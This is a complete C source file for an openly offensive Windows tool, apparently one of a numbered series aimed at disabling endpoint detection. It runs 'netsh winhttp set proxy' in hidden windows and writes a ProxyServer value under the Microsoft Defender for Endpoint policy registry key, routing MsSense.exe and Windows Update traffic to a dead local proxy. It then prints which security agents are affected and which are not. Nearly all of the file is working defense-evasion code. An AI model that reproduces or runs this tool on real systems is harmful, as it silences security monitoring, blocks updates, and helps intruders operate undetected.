/*
 * 09_winhttp_proxy.c
 * WinHTTP/WinINET Proxy Poisoning
 *
 * Sets machine-level WinHTTP proxy settings and/or MDE-specific proxy registry
 * key to route HTTP traffic through a non-existent proxy server.
 * EDR agents using WinHTTP (MsSense.exe, Windows Update, etc.) will fail
 * to connect since the proxy does not respond.
 *
 * Build:
 *   cl 09_winhttp_proxy.c /link Advapi32.lib
 *
 * Usage:
 *   09_winhttp_proxy.exe install   [proxy_server]   (default: 127.0.0.1:9999)
 *   09_winhttp_proxy.exe remove
 *   09_winhttp_proxy.exe show
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <wchar.h>

#pragma comment(lib, "Advapi32.lib")

/*
 * WinHTTP proxy is stored in a binary format in:
 * HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections\WinHttpSettings
 *
 * It's easier to invoke netsh winhttp to set it.
 */

/* MDE-specific proxy registry key */
#define MDE_KEY   L"SOFTWARE\\Policies\\Microsoft\\Windows Advanced Threat Protection"
#define MDE_VALUE L"ProxyServer"

/* Dead proxy address — nothing listens here */
#define DEFAULT_PROXY L"127.0.0.1:9999"

static DWORD RunCmd(const WCHAR *cmd)
{
    WCHAR buf[1024] = {0};
    _snwprintf_s(buf, ARRAYSIZE(buf), _TRUNCATE, L"cmd.exe /c %s", cmd);

    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {0};
    if (!CreateProcessW(NULL, buf, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        return GetLastError();

    WaitForSingleObject(pi.hProcess, 10000);
    DWORD code = 1;
    GetExitCodeProcess(pi.hProcess, &code);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return code;
}

/* Set machine-wide WinHTTP proxy via netsh */
static BOOL SetWinHttpProxy(const WCHAR *proxy)
{
    WCHAR cmd[512] = {0};
    _snwprintf_s(cmd, ARRAYSIZE(cmd), _TRUNCATE,
                 L"netsh winhttp set proxy proxy-server=\"%s\" bypass-list=\"<local>\"",
                 proxy);
    wprintf(L"[*] Running: %s\n", cmd);
    DWORD ret = RunCmd(cmd);
    if (ret == 0) {
        wprintf(L"[+] WinHTTP machine proxy set to: %s\n", proxy);
        return TRUE;
    }
    wprintf(L"[-] netsh command failed: %lu\n", ret);
    return FALSE;
}

/* Remove machine-wide WinHTTP proxy */
static BOOL ResetWinHttpProxy(void)
{
    DWORD ret = RunCmd(L"netsh winhttp reset proxy");
    if (ret == 0) {
        wprintf(L"[+] WinHTTP proxy reset to direct (no proxy)\n");
        return TRUE;
    }
    wprintf(L"[-] netsh reset failed: %lu\n", ret);
    return FALSE;
}

/* Set MDE-specific static proxy in registry */
static BOOL SetMdeProxy(const WCHAR *proxy)
{
    HKEY hKey = NULL;
    DWORD disp = 0;
    LONG err = RegCreateKeyExW(
        HKEY_LOCAL_MACHINE, MDE_KEY,
        0, NULL, REG_OPTION_NON_VOLATILE,
        KEY_WRITE, NULL, &hKey, &disp
    );
    if (err != ERROR_SUCCESS) {
        wprintf(L"  [-] Cannot create/open MDE registry key: %ld\n", err);
        wprintf(L"  [-] (Requires Administrator + key may be protected by policy)\n");
        return FALSE;
    }

    DWORD byteLen = (DWORD)((wcslen(proxy) + 1) * sizeof(WCHAR));
    err = RegSetValueExW(hKey, MDE_VALUE, 0, REG_SZ, (BYTE *)proxy, byteLen);
    RegCloseKey(hKey);

    if (err == ERROR_SUCCESS) {
        wprintf(L"[+] MDE-specific proxy set to: %s\n", proxy);
        return TRUE;
    }
    wprintf(L"[-] RegSetValueExW failed: %ld\n", err);
    return FALSE;
}

/* Remove MDE-specific proxy */
static BOOL RemoveMdeProxy(void)
{
    HKEY hKey = NULL;
    LONG err = RegOpenKeyExW(HKEY_LOCAL_MACHINE, MDE_KEY, 0, KEY_WRITE, &hKey);
    if (err != ERROR_SUCCESS) {
        wprintf(L"  [~] MDE proxy key not found (already removed or not set)\n");
        return TRUE;
    }
    err = RegDeleteValueW(hKey, MDE_VALUE);
    RegCloseKey(hKey);
    if (err == ERROR_SUCCESS || err == ERROR_FILE_NOT_FOUND) {
        wprintf(L"[+] MDE proxy registry value removed.\n");
        return TRUE;
    }
    wprintf(L"[-] RegDeleteValueW failed: %ld\n", err);
    return FALSE;
}

/* Show current proxy settings */
static void ShowProxy(void)
{
    wprintf(L"=== Machine-Level WinHTTP Proxy ===\n");
    RunCmd(L"netsh winhttp show proxy");

    wprintf(L"\n=== MDE-Specific Proxy (Registry) ===\n");
    HKEY hKey = NULL;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, MDE_KEY, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        WCHAR val[256] = {0};
        DWORD valLen = sizeof(val);
        DWORD type   = 0;
        if (RegQueryValueExW(hKey, MDE_VALUE, NULL, &type,
                             (BYTE *)val, &valLen) == ERROR_SUCCESS)
        {
            wprintf(L"  ProxyServer = %s\n", val);
        } else {
            wprintf(L"  ProxyServer not set\n");
        }
        RegCloseKey(hKey);
    } else {
        wprintf(L"  MDE key not found\n");
    }
}

int wmain(int argc, wchar_t *argv[])
{
    wprintf(L"[*] WinHTTP/MDE Proxy Poison Tool\n\n");

    if (argc < 2) {
        wprintf(L"Usage:\n");
        wprintf(L"  %s install [proxy]   Set dead proxy (default: %s)\n",
                argv[0], DEFAULT_PROXY);
        wprintf(L"  %s remove            Restore direct connection\n", argv[0]);
        wprintf(L"  %s show              Show current proxy settings\n", argv[0]);
        return 1;
    }

    if (_wcsicmp(argv[1], L"show") == 0) {
        ShowProxy();
        return 0;
    }

    if (_wcsicmp(argv[1], L"remove") == 0) {
        ResetWinHttpProxy();
        RemoveMdeProxy();
        wprintf(L"\n[+] Proxy settings restored.\n");
        return 0;
    }

    if (_wcsicmp(argv[1], L"install") == 0) {
        const WCHAR *proxy = (argc >= 3) ? argv[2] : DEFAULT_PROXY;

        wprintf(L"[*] Setting dead proxy: %s\n\n", proxy);

        /* Set both machine-wide and MDE-specific */
        SetWinHttpProxy(proxy);
        SetMdeProxy(proxy);

        wprintf(L"\n[+] Proxy poisoning complete.\n");
        wprintf(L"[*] Affected: MsSense.exe, Windows Update, services using WinHTTP\n");
        wprintf(L"[*] Not affected: Chrome, Firefox (own proxy stack), libcurl-based EDRs\n");
        wprintf(L"[*] Run with 'remove' to restore.\n");
        return 0;
    }

    wprintf(L"[-] Unknown command: %s\n", argv[1]);
    return 1;
}
